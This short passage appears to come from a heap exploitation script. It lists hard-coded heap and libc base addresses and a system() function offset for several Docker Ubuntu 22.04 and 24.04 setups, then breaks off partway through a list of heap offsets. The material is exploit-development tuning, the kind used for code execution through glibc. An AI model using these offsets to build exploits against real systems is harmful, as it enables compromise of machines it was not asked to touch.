...
# Docker Ubuntu 24.04 (glibc 2.39) - below for reference — ACTIVE (kernel ~6.18)
...
# Docker Ubuntu 24.04 (glibc 2.39) - below for reference
# Docker Ubuntu 22.04 for reference:
#HEAP_BASE = 0x555555659000
#LIBC_BASE = 0x7ffff77b6000
#SYSTEM_ADDR = LIBC_BASE + 0x50d70
# Docker Ubuntu 22.04 on Ubuntu 24.04 host:
#LIBC_BASE = 0x7ffff77b8000
...
PREREAD_HEAP_OFFSETS = [
    0x60b37,  # Ubuntu 24.04 docker safe addr
    0x05a427, 0x060e67,
